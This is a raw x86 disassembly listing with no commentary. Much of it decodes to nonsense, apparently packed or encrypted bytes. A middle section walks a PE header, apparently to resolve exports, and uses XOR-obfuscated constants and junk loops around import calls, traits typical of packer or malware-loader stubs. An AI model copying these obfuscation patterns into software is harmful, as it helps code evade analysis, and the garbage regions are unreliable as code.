  40e536:	outs   dx,BYTE PTR ds:[esi]
  40e537:	jmp    0x76666dc9
  40e53c:	sub    al,0xff
  40e53e:	mov    ss,WORD PTR [esp+ebp*2+0x6f9b25df]
  40e545:	mov    esi,0xf9f6671a
  40e54a:	xchg   ebx,eax
  40e54b:	mov    esi,ss
  40e54d:	daa    
  40e54e:	inc    edi
  40e54f:	repz ja 0x40e54d
  40e552:	and    bh,ch
  40e554:	mov    ds:0x1b8d560c,al
  40e559:	xor    ah,BYTE PTR [esp+esi*1+0x7a]
  40e55d:	mov    ch,0xf7
  40e55f:	das    
  40e560:	cmp    BYTE PTR [esi+0x14],dh
  40e563:	test   edi,eax
  40e565:	mov    ds:0x7d91ea12,eax
  40e56a:	and    edi,DWORD PTR [esi+0x2a]
  40e56d:	jbe    0x40e517
  40e56f:	pop    es
  40e570:	sbb    eax,0x7108d6e0
  40e575:	pop    ebp
  40e576:	data16 sahf 
  40e578:	sbb    BYTE PTR [esp+ebx*8+0x1a],0xb4
  40e57d:	clc    
  40e57e:	dec    edx
  40e57f:	and    esi,eax
  40e581:	lds    esp,FWORD PTR [ebp-0x68]
  40e584:	mov    cl,BYTE PTR [eax+edx*1]
  40e587:	pushf  
  40e588:	ins    DWORD PTR es:[edi],dx
  40e589:	hlt    
  40e58a:	mov    ecx,0xc002c1a0
  40e58f:	mov    bl,0x29
  40e591:	push   esp
  40e592:	gs xor al,0x73
  40e595:	add    al,0x96
  40e597:	ja     0x40e602
  40e599:	sub    al,0xf1
  40e59b:	mov    eax,edi
  40e59d:	popa   
  40e59e:	push   cs
  40e59f:	fdivr  DWORD PTR [edx-0x4faa4d25]
  40e5a5:	mov    ds:0xd9c49abe,al
  40e5aa:	mov    dl,0xe5
  40e5ac:	add    eax,0xdf3f2ed1
  40e5b1:	dec    esp
  40e5b2:	mov    edx,0x5f69242d
  40e5b7:	sahf   
  40e5b8:	adc    eax,0x2cfd0bee
  40e5bd:	pop    edx
  40e5be:	(bad)  
  40e5bf:	clc    
  40e5c0:	xchg   BYTE PTR [edi+0x54496227],ah
  40e5c6:	cmp    edx,ebp
  40e5c8:	int    0x8
  40e5ca:	leave  
  40e5cb:	pop    edx
  40e5cc:	test   edi,0x387407d9
  40e5d2:	mov    ecx,DWORD PTR [ebx+0x32504bad]
  40e5d8:	pop    ss
  40e5d9:	pop    ss
  40e5da:	sub    BYTE PTR [ebx-0x78],cl
  40e5dd:	cdq    
  40e5de:	cs out dx,al
  40e5e0:	iret   
  40e5e1:	mov    bh,0x8b
  40e5e3:	test   al,0x4a
  40e5e5:	mov    ch,0x21
  40e5e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5e8:	loop   0x40e606
  40e5ea:	add    ebx,DWORD PTR [ecx+0x7b19327b]
  40e5f0:	push   ecx
  40e5f1:	jo     0x40e58c
  40e5f3:	mov    ebx,0x35e15ba4
  40e5f8:	or     al,0x81
  40e5fa:	push   ss
  40e5fb:	sub    BYTE PTR [edx+0x5255b1fd],al
  40e601:	mov    ds:0x4bb5870f,eax
  40e606:	imul   edi,edx,0xf19a47d6
  40e60c:	(bad)  
  40e60d:	out    dx,al
  40e60e:	(bad)  
  40e60f:	mov    eax,ds:0x257ac351
  40e614:	pop    ebp
  40e615:	mov    edi,0xe5ff54de
  40e61a:	push   ss
  40e61b:	inc    ecx
  40e61c:	(bad)  
  40e61d:	dec    ebp
  40e61e:	fdivr  QWORD PTR [ebx-0x49c97db8]
  40e624:	inc    eax
  40e625:	mov    ds:0x216ad6b9,al
  40e62a:	pop    ds
  40e62b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e62c:	mov    bh,0xf5
  40e62e:	stos   DWORD PTR es:[edi],eax
  40e62f:	cwde   
  40e630:	(bad)  [edi-0x39]
  40e633:	dec    edi
  40e634:	lea    eax,[edx+esi*1]
  40e637:	fnstcw WORD PTR [ebp+esi*4+0x29]
  40e63b:	mov    cl,0x65
  40e63d:	inc    esi
  40e63e:	call   0x48c2:0x27cb3697
  40e645:	es push ss
  40e647:	inc    eax
  40e648:	sbb    al,0x2b
  40e64a:	fbld   TBYTE PTR [eax+0x54850a2b]
  40e650:	pop    ds
  40e651:	(bad)  
  40e652:	cmp    DWORD PTR [ecx],edx
  40e654:	xlat   BYTE PTR ds:[ebx]
  40e655:	sbb    DWORD PTR [edi-0x2b],ebp
  40e658:	jl     0x40e638
  40e65a:	inc    ebp
  40e65b:	fisub  DWORD PTR [ecx+ebp*1+0x200ef6a5]
  40e662:	inc    edx
  40e663:	mov    cs,WORD PTR ds:0xfb2756d2
  40e669:	add    eax,DWORD PTR [ebx-0x45]
  40e66c:	xor    ecx,ecx
  40e66e:	mov    ebp,0x6ba2d92c
  40e673:	xor    al,BYTE PTR [ebp-0x61]
  40e676:	and    DWORD PTR [eax+0x49],esp
  40e679:	test   DWORD PTR [eax+ebp*1],eax
  40e67c:	out    0xda,al
  40e67e:	imul   edi,DWORD PTR [eax+0x3d410901],0xda57a445
  40e688:	js     0x40e6ef
  40e68a:	(bad)  
  40e68b:	mov    al,ds:0x8f5ab7e
  40e690:	imul   ebp,ecx,0xba1090a9
  40e696:	scas   eax,DWORD PTR es:[edi]
  40e697:	shr    BYTE PTR [ebp-0x23],cl
  40e69a:	aas    
  40e69b:	dec    edx
  40e69c:	sub    cl,BYTE PTR [ebx+0x1226156d]
  40e6a2:	push   esi
  40e6a3:	bnd jge 0x40e6b9
  40e6a6:	push   es
  40e6a7:	jno    0x40e66c
  40e6a9:	scas   al,BYTE PTR es:[edi]
  40e6aa:	or     edx,edx
  40e6ac:	adc    al,0x2c
  40e6ae:	cmp    esi,ecx
  40e6b0:	dec    eax
  40e6b1:	dec    esp
  40e6b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6b3:	pop    ebp
  40e6b4:	test   al,0xd2
  40e6b6:	ds push edi
  40e6b8:	pop    ds
  40e6b9:	inc    eax
  40e6ba:	shr    BYTE PTR gs:[ebx-0x7265b853],1
  40e6c1:	sub    esp,DWORD PTR [edi+0x789a98f4]
  40e6c7:	push   ebx
  40e6c8:	mov    ah,0xa2
  40e6ca:	fincstp 
  40e6cc:	pushf  
  40e6cd:	in     al,0xb5
  40e6cf:	jge    0x40e6fc
  40e6d1:	add    al,0x1
  40e6d3:	fld    DWORD PTR [ebx+0x79]
  40e6d6:	pusha  
  40e6d7:	mov    ds:0xa4753d06,al
  40e6dc:	mov    dh,0x13
  40e6de:	xchg   ebp,eax
  40e6df:	outs   dx,BYTE PTR ds:[esi]
  40e6e0:	ds inc edi
  40e6e2:	shl    DWORD PTR [eax],cl
  40e6e4:	ja     0x40e723
  40e6e6:	gs stos DWORD PTR es:[edi],eax
  40e6e8:	test   al,0x65
  40e6ea:	cmp    eax,esp
  40e6ec:	cmp    eax,0x880eaaf8
  40e6f1:	scas   al,BYTE PTR es:[edi]
  40e6f2:	in     eax,dx
  40e6f3:	daa    
  40e6f4:	lods   al,BYTE PTR ds:[esi]
  40e6f5:	int3   
  40e6f6:	mov    bl,0x1d
  40e6f8:	push   0x36
  40e6fa:	nop
  40e6fb:	jp     0x40e713
  40e6fd:	sti    
  40e6fe:	mov    edi,DWORD PTR [eax-0x70a65cef]
  40e704:	inc    sp
  40e706:	jno    0x40e6b4
  40e708:	jmp    0xee43:0xf4d24cdc
  40e70f:	iret   
  40e710:	jmp    0x40e6ae
  40e712:	fbld   TBYTE PTR [ebx-0x7]
  40e715:	loop   0x40e791
  40e717:	enter  0xd98d,0x96
  40e71b:	fdivp  st(5),st
  40e71d:	xchg   esp,eax
  40e71e:	and    eax,0xc14bbfff
  40e723:	mov    al,ds:0xd246c84f
  40e728:	icebp  
  40e729:	cmp    al,ah
  40e72b:	in     eax,dx
  40e72c:	push   cs
  40e72d:	sub    eax,0x88638426
  40e732:	fldcw  WORD PTR [ebx+0x5f]
  40e735:	hlt    
  40e736:	lea    esp,[edx]
  40e738:	xor    BYTE PTR [edx-0x14c5dcab],bl
  40e73e:	(bad)  
  40e73f:	pop    ds
  40e740:	cld    
  40e741:	sbb    al,0xbb
  40e743:	ja     0x40e74a
  40e745:	ja     0x40e70a
  40e747:	jo     0x40e715
  40e749:	sar    dh,0xab
  40e74c:	hlt    
  40e74d:	cmp    edx,DWORD PTR [ebx-0x54]
  40e750:	test   BYTE PTR [ebx-0x27],ah
  40e753:	pop    ebp
  40e754:	mov    esp,0x1c1347fd
  40e759:	jo     0x40e6dc
  40e75b:	loope  0x40e73c
  40e75d:	sar    BYTE PTR [edi+0x18],1
  40e760:	ja     0x40e796
  40e762:	(bad)  
  40e763:	pop    ss
  40e764:	adc    DWORD PTR [eax-0xf],0x322f564c
  40e76b:	mov    eax,0xbd7925a8
  40e770:	sub    eax,DWORD PTR [ebx-0x23a5cd73]
  40e776:	dec    eax
  40e777:	out    dx,eax
  40e778:	or     eax,0x83d174ea
  40e77d:	jnp    0x40e795
  40e77f:	push   ecx
  40e780:	mov    ds:0x324a8e2e,al
  40e785:	test   eax,0xa4def485
  40e78a:	or     DWORD PTR [esi],edx
  40e78c:	(bad)  
  40e78d:	pop    DWORD PTR [ecx]
  40e78f:	std    
  40e790:	mov    ebp,0xd1315f7a
  40e795:	xor    eax,0x80cd3f6
  40e79a:	adc    eax,0x5a055396
  40e79f:	inc    ebp
  40e7a0:	dec    ecx
  40e7a1:	mov    ds:0x65967350,al
  40e7a6:	not    DWORD PTR ds:[ebp-0xbae2fa]
  40e7ad:	hlt    
  40e7ae:	hlt    
  40e7af:	pop    ecx
  40e7b0:	push   ecx
  40e7b1:	jns    0x40e7aa
  40e7b3:	cs call 0x88700c9c
  40e7b9:	jo     0x40e7bd
  40e7bb:	xchg   esi,eax
  40e7bc:	lds    esi,FWORD PTR [edi-0x4b]
  40e7bf:	push   edi
  40e7c0:	pop    ds
  40e7c1:	or     DWORD PTR [edx],ebp
  40e7c3:	fistp  DWORD PTR [edx+0x5b]
  40e7c6:	(bad)  
  40e7c7:	push   esi
  40e7c8:	mov    cl,BYTE PTR [esp+ebp*1+0x1703f5d3]
  40e7cf:	fwait
  40e7d0:	dec    esi
  40e7d1:	call   0xf2aadf83
  40e7d6:	lahf   
  40e7d7:	jmp    0x6246:0x3d4d17d7
  40e7de:	jb     0x40e76a
  40e7e0:	cmp    al,0x4a
  40e7e2:	xchg   ebx,eax
  40e7e3:	aam    0x14
  40e7e5:	or     ebx,esi
  40e7e7:	pop    ds
  40e7e8:	jecxz  0x40e7c8
  40e7ea:	addr16 ret 0x8a59
  40e7ee:	push   ds
  40e7ef:	es xchg ecx,eax
  40e7f1:	mov    ecx,0xc41be178
  40e7f6:	retf   
  40e7f7:	fcmovb st,st(1)
  40e7f9:	aam    0xa5
  40e7fb:	mov    ds:0x5e9ca914,eax
  40e800:	jp     0x40e7b1
  40e802:	(bad)  [eax+0x632fb1b3]
  40e808:	stc    
  40e809:	(bad)  
  40e80a:	jmp    0xfec0:0xea885198
  40e811:	imul   eax,DWORD PTR [esi-0x4373f070],0xdd8fbb64
  40e81b:	adc    dl,BYTE PTR [esi]
  40e81d:	mov    DWORD PTR [eax+0x7460b38c],edx
  40e823:	jge    0x40e7bb
  40e825:	mov    ah,0x9f
  40e827:	dec    ebp
  40e828:	lods   al,BYTE PTR ds:[esi]
  40e829:	mov    ecx,0x422aa485
  40e82e:	mov    eax,DWORD PTR [edi-0x59]
  40e831:	dec    edi
  40e832:	ret    0x27e7
  40e835:	outs   dx,BYTE PTR ds:[esi]
  40e836:	inc    edx
  40e837:	clc    
  40e838:	out    0xc2,eax
  40e83a:	fimul  DWORD PTR [ebx+0x51cc94c2]
  40e840:	fwait
  40e841:	mov    cl,0xa6
  40e843:	ud0    edi,DWORD PTR [eax+0x12]
  40e847:	push   cs
  40e848:	xor    eax,0x4a68a0ca
  40e84d:	cmp    edi,eax
  40e84f:	pop    edx
  40e850:	xor    BYTE PTR [ecx],bl
  40e852:	popa   
  40e853:	(bad)  
  40e854:	pop    esi
  40e855:	sbb    ecx,DWORD PTR ds:0x47ab44d
  40e85b:	pusha  
  40e85c:	into   
  40e85d:	jmp    0x40e82c
  40e85f:	add    al,0xaa
  40e861:	jp     0x40e8b7
  40e863:	jp     0x40e80f
  40e865:	push   0x1b
  40e867:	cli    
  40e868:	out    dx,eax
  40e869:	popf   
  40e86a:	sbb    BYTE PTR [eax],bh
  40e86c:	adc    BYTE PTR [edx-0x3c],bh
  40e86f:	dec    esi
  40e870:	out    dx,eax
  40e871:	test   eax,0xa9308404
  40e876:	jae    0x40e85a
  40e878:	sub    DWORD PTR [ebp-0x76a0524a],esi
  40e87e:	jo     0x40e8d1
  40e880:	(bad)  
  40e882:	rol    BYTE PTR [ebx],cl
  40e884:	clc    
  40e885:	rol    ah,1
  40e887:	jae    0x40e830
  40e889:	mov    dh,0x6e
  40e88b:	imul   ebx,DWORD PTR [ebx],0x2f2271ba
  40e891:	shl    BYTE PTR [edi],0xa1
  40e894:	mov    edi,0x74d62fd1
  40e899:	mov    dl,BYTE PTR [edx-0x3e]
  40e89c:	cmp    al,0xb1
  40e89e:	pop    es
  40e89f:	cmp    DWORD PTR [ebx+0x5d],ecx
  40e8a2:	mov    ebp,0xadd42de7
  40e8a7:	les    esi,FWORD PTR [ecx-0x7d1e9895]
  40e8ad:	mov    gs:0x196ccac4,eax
  40e8b3:	pop    eax
  40e8b4:	in     al,dx
  40e8b5:	sbb    ah,BYTE PTR [edi]
  40e8b7:	xor    DWORD PTR [ebx+esi*4-0x4d244e1c],esp
  40e8be:	sub    ebx,DWORD PTR [edx+0x67]
  40e8c1:	pop    ecx
  40e8c2:	cdq    
  40e8c3:	rcr    cl,1
  40e8c5:	hlt    
  40e8c6:	std    
  40e8c7:	jo     0x40e8c2
  40e8c9:	mov    eax,ds:0xd47ac5a0
  40e8ce:	rcr    DWORD PTR cs:[esi-0x360c122f],cl
  40e8d5:	test   al,0x49
  40e8d7:	mov    bh,0x46
  40e8d9:	pusha  
  40e8da:	into   
  40e8db:	arpl   WORD PTR ds:0x2a96ba6b,bx
  40e8e1:	mov    bl,0xdc
  40e8e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8e4:	enter  0x94d2,0x10
  40e8e8:	aas    
  40e8e9:	mov    dh,0x31
  40e8eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8ec:	xchg   ecx,eax
  40e8ed:	xor    al,0x77
  40e8ef:	mov    edi,0x1347fa2f
  40e8f4:	sub    eax,0xfd8fc059
  40e8f9:	(bad)  
  40e8fa:	retf   0x2147
  40e8fd:	popf   
  40e8fe:	mov    dh,0x6e
  40e900:	sub    esp,DWORD PTR [ebp+ebx*8+0x4c]
  40e904:	arpl   ax,si
  40e906:	inc    esi
  40e907:	sub    al,0x89
  40e909:	mov    edi,0x2331deaa
  40e90e:	cmp    bl,BYTE PTR [edx-0x69890d37]
  40e914:	pop    ds
  40e915:	ins    BYTE PTR es:[edi],dx
  40e916:	push   es
  40e917:	daa    
  40e918:	bound  ecx,QWORD PTR [eax+0x59165490]
  40e91e:	sub    edx,DWORD PTR [ecx+0x7]
  40e921:	imul   edx,DWORD PTR [ecx],0x619a7d4c
  40e927:	fs jge 0x40e996
  40e92a:	mov    eax,ds:0x53cdbd9f
  40e92f:	xor    bh,BYTE PTR [eax]
  40e931:	mov    al,0xa5
  40e933:	push   eax
  40e934:	xor    BYTE PTR [edx],0x80
  40e937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e939:	outs   dx,DWORD PTR ds:[esi]
  40e93a:	gs out 0xa9,al
  40e93d:	dec    esp
  40e93e:	int    0xa3
  40e940:	sar    ecx,0xce
  40e943:	mov    ds:0x11d5bb2f,eax
  40e948:	sbb    BYTE PTR [edi-0x18353195],0x4
  40e94f:	add    BYTE PTR [edx-0x69],dh
  40e952:	inc    ebp
  40e953:	xchg   ebp,eax
  40e954:	mov    ds:0x4fdb5d,eax
  40e959:	and    BYTE PTR [eax+0x74fdccbc],0x8f
  40e960:	cli    
  40e961:	hlt    
  40e962:	mov    al,0x72
  40e964:	iret   
  40e965:	xor    BYTE PTR [edi+0x62],al
  40e968:	xor    cl,BYTE PTR [ebx]
  40e96a:	out    0x7e,eax
  40e96c:	in     eax,dx
  40e96d:	es loop 0x40e968
  40e970:	imul   esi,DWORD PTR [ebx-0x46b6e990],0xedbb03c1
  40e97a:	das    
  40e97b:	mov    dl,0xf6
  40e97d:	add    DWORD PTR [esi+0x28fefe56],edx
  40e983:	inc    esp
  40e984:	xchg   ebp,eax
  40e985:	ret    0x10a4
  40e988:	cli    
  40e989:	shr    DWORD PTR [ebx+0x28],1
  40e98c:	and    ch,BYTE PTR [ebx-0x5469616d]
  40e992:	or     BYTE PTR [ecx+esi*4],dl
  40e995:	call   FWORD PTR [edi+0x74]
  40e998:	mov    edi,DWORD PTR [eax+0x3c]
  40e99b:	lea    esi,[edi+esi*8+0x78]
  40e99f:	mov    esi,DWORD PTR [esi+eax*1]
  40e9a2:	mov    DWORD PTR [ebp-0x8],esi
  40e9a5:	mov    esi,DWORD PTR [ebp+0x8]
  40e9a8:	xor    esi,ecx
  40e9aa:	add    esi,edx
  40e9ac:	mov    DWORD PTR [ebp-0x14],esi
  40e9af:	mov    esi,DWORD PTR [ebp+0x8]
  40e9b2:	mov    edi,DWORD PTR [ebp-0x8]
  40e9b5:	xor    esi,ecx
  40e9b7:	add    esi,edx
  40e9b9:	pop    ebx
  40e9ba:	cmp    edi,esi
  40e9bc:	jne    0x40e9da
  40e9c2:	mov    eax,DWORD PTR [ebp+0xc]
  40e9c5:	xor    eax,ecx
  40e9c7:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9ca:	add    eax,edx
  40e9cc:	imul   eax,ecx
  40e9cf:	mov    DWORD PTR [ebp-0x8],eax
  40e9d2:	push   DWORD PTR [ebp+0x18]
  40e9d5:	jmp    0x40ea2e
  40e9da:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9dd:	add    ecx,eax
  40e9df:	mov    DWORD PTR [ebp-0x14],ecx
  40e9e2:	mov    ecx,DWORD PTR [ebp-0x14]
  40e9e5:	mov    ecx,DWORD PTR [ecx+0xc]
  40e9e8:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e9ed:	mov    edx,0x3b51
  40e9f2:	sub    cx,dx
  40e9f5:	mov    edx,0x8a8d
  40e9fa:	xor    cx,dx
  40e9fd:	mov    edx,0x4e77
  40ea02:	cmp    cx,dx
  40ea05:	jne    0x40e9d2
  40ea0b:	mov    ecx,DWORD PTR ds:0x42e2b7
  40ea11:	mov    ecx,DWORD PTR [ecx+0x198]
  40ea17:	mov    DWORD PTR [ecx],eax
  40ea19:	jmp    0x40ea3f
  40ea1e:	mov    ecx,DWORD PTR [ebp+0x18]
  40ea21:	cmp    ecx,0xf89c8584
  40ea27:	jne    0x40ea3f
  40ea2d:	push   eax
  40ea2e:	push   DWORD PTR [ebp+0x14]
  40ea31:	push   DWORD PTR [ebp+0x10]
  40ea34:	push   DWORD PTR [ebp+0xc]
  40ea37:	push   DWORD PTR [ebp+0x8]
  40ea3a:	call   0x405799
  40ea3f:	pop    edi
  40ea40:	pop    esi
  40ea41:	leave  
  40ea42:	ret    0x14
  40ea45:	push   ebp
  40ea46:	mov    ebp,esp
  40ea48:	sub    esp,0xc
  40ea4b:	and    DWORD PTR ds:0x42d00c,0x0
  40ea55:	jmp    0x40ea67
  40ea5a:	mov    edx,DWORD PTR ds:0x42d00c
  40ea60:	inc    edx
  40ea61:	mov    DWORD PTR ds:0x42d00c,edx
  40ea67:	cmp    DWORD PTR ds:0x42d00c,0x16
  40ea6e:	jae    0x40eb33
  40ea74:	cmp    DWORD PTR ds:0x42d00c,0xd
  40ea7b:	jne    0x40eac1
  40ea81:	push   0x42e075
  40ea86:	push   0x6212
  40ea8b:	push   DWORD PTR [ebp-0x28]
  40ea8e:	push   0x739a
  40ea93:	push   DWORD PTR [ebp-0x20]
  40ea96:	push   0x3288
  40ea9b:	push   DWORD PTR [ebp-0x28]
  40ea9e:	push   DWORD PTR [ebp-0x1c]
  40eaa1:	push   0x2781
  40eaa6:	push   0x445b
  40eaab:	push   0x2755
  40eab0:	push   DWORD PTR [ebp-0x24]
  40eab3:	push   DWORD PTR [ebp-0x1c]
  40eab6:	push   0x361a
  40eabb:	call   DWORD PTR ds:0x42e8bb
  40eac1:	cmp    DWORD PTR ds:0x42d00c,0xc
  40eac8:	jne    0x40eadb
  40eace:	mov    edx,DWORD PTR ds:0x42d00c
  40ead4:	inc    edx
  40ead5:	mov    DWORD PTR ds:0x42d00c,edx
  40eadb:	jmp    0x40ea5a
  40eae0:	and    DWORD PTR ds:0x42c008,0x0
  40eaea:	jmp    0x40eafe
  40eaef:	xor    edx,edx
  40eaf1:	or     edx,DWORD PTR ds:0x42c008
  40eaf7:	inc    edx
  40eaf8:	mov    DWORD PTR ds:0x42c008,edx
  40eafe:	cmp    DWORD PTR ds:0x42c008,0x14
  40eb05:	jae    0x40eb33
  40eb0b:	cmp    DWORD PTR ds:0x42c008,0x18
  40eb12:	jne    0x40eb2e
  40eb18:	push   DWORD PTR [ebp-0x24]
  40eb1b:	push   DWORD PTR [ebp-0x18]
  40eb1e:	push   0x8994
  40eb23:	push   0x6271
  40eb28:	call   DWORD PTR ds:0x42e8e7
  40eb2e:	jmp    0x40eaef
  40eb33:	push   esi
  40eb34:	mov    esi,0xf89c8585
  40eb39:	xor    DWORD PTR ds:0x429000,ebx
  40eb3f:	mov    DWORD PTR [ebp-0x8],esi
  40eb42:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40eb49:	mov    edx,DWORD PTR ds:0x41cd75
  40eb4f:	mov    ecx,DWORD PTR ds:0x41ce0c
  40eb55:	sub    ecx,edx
  40eb57:	add    edx,DWORD PTR [edx+ecx*1]
  40eb5a:	push   edi
  40eb5b:	mov    eax,eax
  40eb5d:	mov    eax,DWORD PTR [ebp-0x4]
  40eb60:	mov    edi,DWORD PTR [ebp-0x8]
  40eb63:	mov    ecx,0x751089b
  40eb68:	xor    eax,ecx
  40eb6a:	xor    edi,ecx
  40eb6c:	mov    edx,0x3272e2
  40eb71:	add    edi,edx
  40eb73:	add    eax,edx
  40eb75:	imul   eax,edi
  40eb78:	mov    edi,DWORD PTR [ebp+0xc]
  40eb7b:	cmp    edi,eax
  40eb7d:	je     0x40ebd2
  40eb83:	mov    DWORD PTR [ebp-0xc],esi
  40eb86:	mov    eax,DWORD PTR [ebp-0xc]
  40eb89:	mov    esi,DWORD PTR [ebp+0xc]
  40eb8c:	xor    eax,ecx
  40eb8e:	lea    eax,[eax*8+0x1939788]
  40eb95:	mov    eax,DWORD PTR [esi+eax*1]
  40eb98:	mov    DWORD PTR [ebp+0xc],eax
  40eb9b:	mov    eax,DWORD PTR [ebp-0x4]
  40eb9e:	mov    esi,DWORD PTR [ebp-0x8]
  40eba1:	xor    eax,ecx
  40eba3:	xor    esi,ecx
  40eba5:	add    esi,edx
  40eba7:	add    eax,edx
  40eba9:	imul   eax,esi
  40ebac:	mov    esi,DWORD PTR [ebp+0xc]
  40ebaf:	cmp    esi,eax
  40ebb1:	je     0x40ebd2
  40ebb7:	mov    eax,DWORD PTR [ebp-0x4]
  40ebba:	xor    eax,ecx
  40ebbc:	mov    ecx,DWORD PTR [ebp+0xc]
  40ebbf:	add    eax,edx
  40ebc1:	imul   eax,ecx
  40ebc4:	add    eax,DWORD PTR [ebp+0x8]
  40ebc7:	mov    DWORD PTR [ebp+0xc],eax
  40ebca:	mov    eax,DWORD PTR [ebp+0xc]
  40ebcd:	jmp    0x40ebe3
  40ebd2:	mov    eax,DWORD PTR [ebp-0x4]
  40ebd5:	mov    esi,DWORD PTR [ebp-0x8]
  40ebd8:	xor    esi,ecx
  40ebda:	xor    eax,ecx
  40ebdc:	add    esi,edx
  40ebde:	add    eax,edx
  40ebe0:	imul   eax,esi
  40ebe3:	pop    edi
  40ebe4:	pop    esi
  40ebe5:	leave  
  40ebe6:	ret    0x8
  40ebe9:	push   ebp
  40ebea:	mov    ebp,esp
  40ebec:	push   ecx
  40ebed:	and    DWORD PTR ds:0x42a00c,0x0
  40ebf7:	xor    ecx,ecx
  40ebf9:	or     ecx,DWORD PTR ds:0x42a00c
  40ebff:	inc    ecx
  40ec00:	mov    DWORD PTR ds:0x42a00c,ecx
  40ec06:	cmp    DWORD PTR ds:0x42a00c,0x21
  40ec0d:	jne    0x40ec29
  40ec13:	push   0x29ed
  40ec18:	push   DWORD PTR [ebp-0x24]
  40ec1b:	push   0x42e0c2
  40ec20:	push   DWORD PTR [ebp-0x28]
  40ec23:	call   DWORD PTR ds:0x42e8eb
  40ec29:	cmp    DWORD PTR ds:0x42a00c,0x1f
  40ec30:	jb     0x40ebf7
  40ec36:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40ec3d:	mov    eax,DWORD PTR [ebp-0x4]
  40ec40:	mov    edx,DWORD PTR [ebp+0x10]
  40ec43:	and    DWORD PTR ds:0x42b004,0x0
  40ec4d:	jmp    0x40ec5f
  40ec52:	mov    ecx,DWORD PTR ds:0x42b004
  40ec58:	inc    ecx
  40ec59:	mov    DWORD PTR ds:0x42b004,ecx
  40ec5f:	cmp    DWORD PTR ds:0x42b004,0x1d
  40ec66:	jae    0x40ec84
  40ec6c:	cmp    DWORD PTR ds:0x42b004,0x29
  40ec73:	jne    0x40ec7f
  40ec79:	call   DWORD PTR ds:0x42e8ef
  40ec7f:	jmp    0x40ec52
  40ec84:	mov    ecx,0x751089b
  40ec89:	xor    eax,ecx
  40ec8b:	add    eax,0x3272e2
  40ec90:	mov    DWORD PTR [edx],eax
  40ec92:	mov    eax,DWORD PTR [ebp+0xc]
  40ec95:	xor    eax,ecx
  40ec97:	push   esi
  40ec98:	mov    esi,DWORD PTR [ebp+0x10]
  40ec9b:	mov    edx,0x3272e2
  40eca0:	add    eax,edx
  40eca2:	mov    DWORD PTR [esi+0x4],eax
  40eca5:	mov    eax,DWORD PTR [ebp+0x14]
  40eca8:	mov    esi,DWORD PTR [ebp+0x10]
  40ecab:	mov    DWORD PTR [esi+0x8],eax
  40ecae:	mov    eax,DWORD PTR [ebp+0x18]
  40ecb1:	mov    esi,DWORD PTR [ebp+0x10]
  40ecb4:	mov    DWORD PTR [esi+0xc],eax
  40ecb7:	mov    eax,DWORD PTR [ebp+0x1c]
  40ecba:	mov    esi,DWORD PTR [ebp+0x10]
  40ecbd:	mov    DWORD PTR [esi+0x10],eax
  40ecc0:	mov    eax,DWORD PTR [ebp+0x8]
  40ecc3:	xor    eax,ecx
  40ecc5:	add    eax,edx
  40ecc7:	pop    esi
  40ecc8:	leave  
  40ecc9:	ret    0x18
  40eccc:	push   ebp
  40eccd:	mov    ebp,esp
  40eccf:	sub    esp,0x9c
  40ecd5:	adc    DWORD PTR ds:0x42c004,ecx
  40ecdb:	jmp    0x411024
  40ece0:	xor    edx,edx
  40ece2:	jg     0x40ecc5
  40ece4:	(bad)  
  40ece6:	mov    bl,0xb2
  40ece8:	pop    ebx
  40ece9:	ja     0x40ecd9
  40eceb:	inc    eax
  40ecec:	cs (bad) 
  40ecee:	(bad)  
  40ecef:	xor    bh,BYTE PTR [esp+ecx*8+0x7c]
  40ecf3:	jl     0x40ed35
  40ecf5:	pop    edi
  40ecf6:	jl     0x40ed74
  40ecf8:	shl    al,1
  40ecfa:	mov    cs,WORD PTR [ebp-0x4c]
  40ecfd:	aam    0x91
  40ecff:	(bad)  [ebx-0x24ec4b79]
  40ed05:	or     al,0x82
  40ed07:	retf   
  40ed08:	lea    eax,[esi]
  40ed0a:	pop    esp
  40ed0b:	in     eax,dx
  40ed0c:	(bad)  
  40ed0d:	xchg   ebx,eax
  40ed0e:	scas   eax,DWORD PTR es:[edi]
  40ed0f:	lahf   
  40ed10:	(bad)
  40ed14:	adc    DWORD PTR [eax+0x34],ebp
  40ed17:	loope  0x40ed03
  40ed19:	(bad)
  40ed1d:	xor    ecx,DWORD PTR [ebx+ebp*4-0x343e3676]
  40ed24:	add    bl,BYTE PTR [edi+0x8]
  40ed27:	xchg   edx,eax
  40ed28:	jg     0x40ecd4
  40ed2a:	jnp    0x40ecb6
  40ed2c:	dec    edi
  40ed2d:	xchg   DWORD PTR [edi],esi
  40ed2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed30:	mov    edx,0x961ade3b
  40ed35:	dec    eax
  40ed36:	and    al,BYTE PTR [eax]
  40ed38:	xchg   edx,eax
  40ed39:	test   BYTE PTR [ecx],cl
  40ed3b:	xor    ebx,DWORD PTR [edi+0x3b76bdb0]
  40ed41:	xchg   BYTE PTR [ebp+0x5fe9a557],ch
  40ed47:	dec    edi
  40ed48:	ret    0xfa6a
  40ed4b:	ret    
  40ed4c:	cli    
  40ed4d:	mov    esp,0x559c81d8
  40ed52:	gs inc ebx
  40ed54:	fisubr WORD PTR [ebp-0x40aa96f4]
  40ed5a:	jmp    0xbc0e:0x29f48a71
  40ed61:	outs   dx,BYTE PTR ds:[esi]
  40ed62:	sbb    DWORD PTR [edi],edx
  40ed64:	sub    eax,0xc2334caf
  40ed6a:	das    
  40ed6b:	and    DWORD PTR [ecx+0x1b],0xffffffd9
  40ed6f:	pop    esi
  40ed70:	mov    ?,WORD PTR [edi+eiz*8-0x4feae9e3]
  40ed77:	cmp    ecx,edi
  40ed79:	jb     0x40ed46
  40ed7b:	mov    eax,0xf950435f
  40ed80:	sub    ebx,DWORD PTR [ecx+0x2696a092]
  40ed86:	sub    bl,BYTE PTR [ebp+0x66]
  40ed89:	aaa    
